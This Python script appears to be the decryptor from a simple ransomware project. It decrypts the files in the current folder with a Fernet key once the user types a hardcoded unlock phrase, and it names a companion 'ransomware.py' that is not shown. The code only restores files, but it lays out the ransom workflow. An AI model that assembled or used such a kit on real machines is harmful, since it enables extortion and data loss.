import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file!= 'ransomware.py' and file!='thekey.key' and file!='ransom_decrypt.py':
        files.append(file)
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "12345678"

user_phrase = input("Enter the secret phrase to decrypt your files: ")
if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("All your files are decrypted. You can use them now.")
else:
    print("Incorrect secret phrase. Your files remain encrypted.")
